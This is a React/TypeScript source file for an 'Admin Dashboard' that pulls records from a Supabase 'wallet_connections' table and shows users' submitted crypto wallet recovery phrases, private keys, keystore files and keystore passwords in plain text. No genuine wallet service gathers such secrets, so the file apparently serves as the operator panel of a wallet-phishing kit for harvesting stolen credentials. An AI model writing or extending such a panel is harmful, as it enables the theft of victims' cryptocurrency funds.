import React, { useEffect, useState } from 'react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Button } from '@/components/ui/button';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/lib/supabase';
import type { WalletConnection } from '@/lib/supabase';

const AdminDashboard = () => {
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState("phrases");
  const [connections, setConnections] = useState<WalletConnection[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchConnections();
  }, []);

  const fetchConnections = async () => {
    try {
      const { data, error } = await supabase
        .from('wallet_connections')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;
      setConnections(data || []);
    } catch (error) {
      console.error('Error fetching connections:', error);
    } finally {
      setLoading(false);
    }
  };

  const filterConnections = (type: string) => {
    return connections.filter(conn => conn.connection_type === type);
  };

  return (
    <div className="container mx-auto px-4 py-12">
      <div className="flex justify-between items-center mb-8">
        <h1 className="text-3xl font-bold text-gradient">Admin Dashboard</h1>
        <Button variant="outline" onClick={() => navigate('/')}>
          Back to Home
        </Button>
      </div>

      <div className="glass-card p-6 mb-8">
        <h2 className="text-xl font-semibold mb-4 text-web3-primary">Dashboard Overview</h2>
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
          <div className="glass-card bg-web3-primary/10 p-4">
            <p className="text-gray-400 text-sm">Total Submissions</p>
            <p className="text-2xl font-bold">{connections.length}</p>
          </div>
          <div className="glass-card bg-web3-primary/10 p-4">
            <p className="text-gray-400 text-sm">Recovery Phrases</p>
            <p className="text-2xl font-bold">{filterConnections('phrase').length}</p>
          </div>
          <div className="glass-card bg-web3-primary/10 p-4">
            <p className="text-gray-400 text-sm">Private Keys</p>
            <p className="text-2xl font-bold">{filterConnections('private_key').length}</p>
          </div>
        </div>
      </div>

      <Tabs defaultValue="phrases" className="w-full" onValueChange={setActiveTab}>
        <TabsList className="grid w-full grid-cols-3 mb-8">
          <TabsTrigger value="phrases">Recovery Phrases</TabsTrigger>
          <TabsTrigger value="privateKeys">Private Keys</TabsTrigger>
          <TabsTrigger value="keystores">Keystores</TabsTrigger>
        </TabsList>
        
        <TabsContent value="phrases" className="space-y-4">
          {loading ? (
            <p className="text-center text-gray-400 py-8">Loading...</p>
          ) : filterConnections('phrase').length > 0 ? (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-web3-dark text-gray-200">
                  <tr>
                    <th className="p-3 text-left">Wallet</th>
                    <th className="p-3 text-left">Recovery Phrase</th>
                    <th className="p-3 text-left">Timestamp</th>
                  </tr>
                </thead>
                <tbody>
                  {filterConnections('phrase').map((conn) => (
                    <tr key={conn.id} className="border-b border-web3-primary/10">
                      <td className="p-3">{conn.wallet_name}</td>
                      <td className="p-3 font-mono text-sm text-web3-primary">{conn.data.phrase}</td>
                      <td className="p-3 text-sm text-gray-400">
                        {new Date(conn.created_at).toLocaleString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : (
            <p className="text-center text-gray-400 py-8">No recovery phrases submitted yet.</p>
          )}
        </TabsContent>
        
        <TabsContent value="privateKeys" className="space-y-4">
          {loading ? (
            <p className="text-center text-gray-400 py-8">Loading...</p>
          ) : filterConnections('private_key').length > 0 ? (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-web3-dark text-gray-200">
                  <tr>
                    <th className="p-3 text-left">Wallet</th>
                    <th className="p-3 text-left">Private Key</th>
                    <th className="p-3 text-left">Timestamp</th>
                  </tr>
                </thead>
                <tbody>
                  {filterConnections('private_key').map((conn) => (
                    <tr key={conn.id} className="border-b border-web3-primary/10">
                      <td className="p-3">{conn.wallet_name}</td>
                      <td className="p-3 font-mono text-sm text-web3-primary">{conn.data.private_key}</td>
                      <td className="p-3 text-sm text-gray-400">
                        {new Date(conn.created_at).toLocaleString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : (
            <p className="text-center text-gray-400 py-8">No private keys submitted yet.</p>
          )}
        </TabsContent>
        
        <TabsContent value="keystores" className="space-y-4">
          {loading ? (
            <p className="text-center text-gray-400 py-8">Loading...</p>
          ) : filterConnections('keystore').length > 0 ? (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-web3-dark text-gray-200">
                  <tr>
                    <th className="p-3 text-left">Wallet</th>
                    <th className="p-3 text-left">Keystore JSON</th>
                    <th className="p-3 text-left">Password</th>
                    <th className="p-3 text-left">Timestamp</th>
                  </tr>
                </thead>
                <tbody>
                  {filterConnections('keystore').map((conn) => (
                    <tr key={conn.id} className="border-b border-web3-primary/10">
                      <td className="p-3">{conn.wallet_name}</td>
                      <td className="p-3 font-mono text-sm text-web3-primary">
                        {conn.data.keystore_json?.substring(0, 50)}...
                      </td>
                      <td className="p-3">{conn.data.keystore_password}</td>
                      <td className="p-3 text-sm text-gray-400">
                        {new Date(conn.created_at).toLocaleString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : (
            <p className="text-center text-gray-400 py-8">No keystores submitted yet.</p>
          )}
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default AdminDashboard;